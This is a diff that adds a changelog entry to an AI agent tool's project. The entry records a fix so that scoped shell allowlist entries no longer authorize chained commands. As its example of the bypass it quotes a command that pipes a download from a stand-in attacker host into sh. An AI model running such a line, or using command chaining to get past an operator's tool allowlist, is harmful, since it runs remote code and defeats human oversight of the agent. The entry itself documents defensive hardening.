@@ -309,6 +309,31 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Fixed
 
+- **A scoped `--allowed-tools` glob entry no longer authorizes a
+  chained shell command it wasn't written to match.** `AllowListGate::check`
+  (one-shot mode's `allowlist` gate) matched a `tool_name(arg_glob)` entry's
+  pattern with a raw `globset::Glob`, whose `*` matches shell
+  metacharacters as readily as anything else — so `--allowed-tools
+  'bash(git *)'`, read by an operator as "may run git commands," also
+  silently authorized `git status; curl evil.com|sh` and equivalent `&&`/
+  backtick-chained commands. `ArgMatcher::allows` (used only for **allowed**
+  entries) now calls the same `conway_core::permission_pattern::
+  contains_shell_metacharacters` check `PatternRule::matches_render` uses,
+  in the same order — before the glob comparison, and only when the tool's
+  `render_kind` is `ShellCommand` — so a metacharacter-carrying value never
+  matches a glob entry. **A bare `tool_name` entry (`--allowed-tools
+  bash`) is deliberately unaffected**: it already grants that tool
+  unrestricted access (this is the documented, default path), so gating it
+  would reject every documented example for zero security gain. A
+  **denied** `tool_name(arg_glob)` entry is also unaffected, mirroring
+  `PatternRule::matches_deny`'s own asymmetry: a deny match must stay hard
+  to evade regardless of what the value contains. The `tool_name(arg_glob)`
+  scoping syntax itself — previously discoverable only from
+  `AllowListGate`'s rustdoc and its test suite — is now documented in
+  `docs/scripting.md` alongside `--allowed-tools`/`--deny-tools`.
+  (`crates/conway/src/gates.rs`, `crates/conway/tests/gates.rs`,
+  `docs/scripting.md`)
+
 - **`probe_on_startup` no longer overrides a `models.json`-configured
   `max_context_tokens`/`reliability_tier` in the router's own capability
   index.** `ConwayBuilder::build`'s startup probe step
